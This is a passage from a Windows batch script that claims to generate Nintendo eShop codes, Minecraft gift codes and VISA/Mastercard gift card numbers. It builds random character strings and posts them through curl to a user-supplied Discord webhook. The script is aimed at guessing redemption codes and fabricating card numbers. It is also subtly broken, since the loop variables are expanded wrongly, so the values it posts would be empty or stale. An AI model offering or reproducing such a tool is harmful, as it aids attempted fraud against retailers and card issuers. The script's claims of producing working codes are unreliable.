set /p "num_codes=Enter the number of Nintendo eShop codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.nintendo.com/en_US/shop/redeem/%code%\"}" %webhook%
)

goto nintendoeshopgen_loop

:minecraftgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=25"

set /p "webhook=Enter Discord webhook URL for Minecraft gift codes: "

:minecraftgen_loop
set /p "num_codes=Enter the number of Minecraft gift codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.minecraft.net/redeem/%code%\"}" %webhook%
)

goto minecraftgen_loop
:visamastercardgen
@echo off
setlocal
set "characters=0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for VISA/Mastercard gift cards: "

:visamastercardgen_loop
set /p "num_cards=Enter the number of VISA/Mastercard gift cards to generate (0 to exit): "
if %num_cards% equ 0 goto menu

for /l %%n in (1,1,%num_cards%) do (
    set "card_number="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 10"
        for %%j in (!rand_idx!) do set "digit=!characters:~%%j,1!"
        set "card_number=!card_number!!digit!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"VISA/Mastercard Gift Card Number: %card_number%\"}" %webhook%
)

goto visamastercardgen_loop
